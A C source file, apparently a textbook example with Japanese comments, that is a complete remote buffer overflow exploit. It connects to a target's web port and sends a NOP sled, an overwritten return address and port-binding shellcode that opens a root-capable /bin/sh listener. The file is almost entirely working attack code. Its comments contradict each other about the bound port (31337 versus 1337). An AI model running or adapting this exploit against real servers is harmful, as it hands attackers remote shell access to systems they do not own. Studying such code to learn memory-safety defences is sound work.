#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#include "hacking.h"
#include "hacking-network.h"


char shellcode[]="\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80";
// ポートバインド型シェルコード（31337番を使用）
// Shell Bind TCP Shellcode Port 1337 -- 89 bytes

#define OFFSET 524
#define RETADDR 0xffffd058

int main(int argc, char *argv[]) {
   int sockfd, buflen;
   struct hostent *host_info;
   struct sockaddr_in target_addr;
   unsigned char buffer[600];

   if(argc < 2) {
      printf("使用方法： %s ＜ホスト名＞\n", argv[0]);
      exit(1);
   }

   if((host_info = gethostbyname(argv[1])) == NULL)
      fatal("ホスト名の検索に失敗しました。");

   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
      fatal("ソケットの生成に失敗しました。");

   target_addr.sin_family = AF_INET;
   target_addr.sin_port = htons(80);
   target_addr.sin_addr = *((struct in_addr *)host_info->h_addr);
   memset(&(target_addr.sin_zero), '\0', 8); // 構造体の残りをゼロクリアする

   if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)
      fatal("攻撃対象サーバへの接続に失敗しました。");

   bzero(buffer, 600);                      // バッファをゼロクリアする
   memset(buffer, '\x90', OFFSET);          // NOPスレッドを構築する
   *((u_int *)(buffer + OFFSET)) = RETADDR; // 戻りアドレスを埋める
   memcpy(buffer+300, shellcode, strlen(shellcode)); // シェルコード
   strcat(buffer, "\r\n");                  // 文字列を終端させる
   printf("脆弱性攻撃バッファ：\n");
   dump(buffer, strlen(buffer));  // 脆弱性攻撃バッファを表示する
   send_string(sockfd, buffer);   // 脆弱性攻撃バッファをHTTPリクエストとして送信する

   exit(0);
}
